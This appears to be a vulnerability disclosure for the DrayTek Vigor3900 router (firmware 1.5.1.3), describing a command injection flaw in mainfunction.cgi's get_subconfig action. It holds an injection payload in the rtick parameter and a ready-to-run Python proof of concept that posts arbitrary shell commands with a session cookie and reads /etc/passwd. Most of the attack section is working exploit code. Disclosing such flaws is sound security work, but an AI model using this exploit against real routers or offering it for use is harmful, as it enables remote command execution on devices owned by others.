**Supplier**: DrayTek

**Router model**: Vigor3900

**Router Version**: 1.5.1.3

# Vulnerability introduction

Attackers with this version of the router firmware can inject malicious commands into mainfunction.cgi and execute arbitrary commands by calling the get_subconfig function.

# Vulnerability analysis

There is a command injection vulnerability in the sub_EE40 function in the /www/cgi-bin/mainfunction.cgi binary file of this version of the router. In the splicing of characters in the figure below, we can see that we can use single quotes to bypass it.

![image](https://github.com/user-attachments/assets/c9cc648d-5cbf-40a8-bab4-8ca10c90d88c)

![image](https://github.com/user-attachments/assets/2ac25e18-78e8-4d08-83c8-e465dbf40cd5)

![image](https://github.com/user-attachments/assets/1f85576e-ca77-40a3-967e-50417d8d8f81)

action=get_subconfig&config=ipv6_neigh&rtick=%27%0A\`echo${IFS}test>/tmp/hacked\`%0A%27

![image](https://github.com/user-attachments/assets/8934f440-925b-4d84-a231-725f15b69094)

# POC

![image](https://github.com/user-attachments/assets/60c60e7b-7643-491f-92c8-06be81049eda)

```python
import requests

def poc(cmd, Cookie):
    url = "http://10.10.10.2/cgi-bin/mainfunction.cgi"
    data = f"action=get_subconfig&config=ipv6_neigh&rtick=%27%0A`{cmd}`%0A%27"
    headers = {
        "Host": "10.10.10.2",
        "Content-Length": "128",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Origin": "http://10.10.10.2",
        "Referer": "http://10.10.10.2/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Cookie": Cookie,
        "Connection": "close"
    }
    response = requests.post(url, data=data, headers=headers)
    return response.text
#You need to capture the packet first to get the corresponding cookie
cmd = """echo `cat /etc/passwd`"""
Cookie = "SESSION_ID_VIGOR=7:8022D38392BF0B33CDF6F40167C7ADD2"
print(poc(cmd, Cookie))
```


